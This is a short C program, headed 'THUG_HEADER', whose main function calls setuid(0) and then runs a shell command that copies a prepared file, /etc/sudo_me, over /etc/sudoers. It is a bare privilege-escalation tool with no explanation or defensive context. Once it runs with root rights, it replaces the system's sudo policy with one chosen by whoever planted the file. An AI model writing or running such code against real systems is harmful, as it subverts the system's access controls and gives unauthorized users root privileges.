/*
** THUG_HEADER
*/

#include <stdlib.h>

int	main(void)
{
  setuid(0);
  system("cp /etc/sudo_me /etc/sudoers");
  return (0);
}
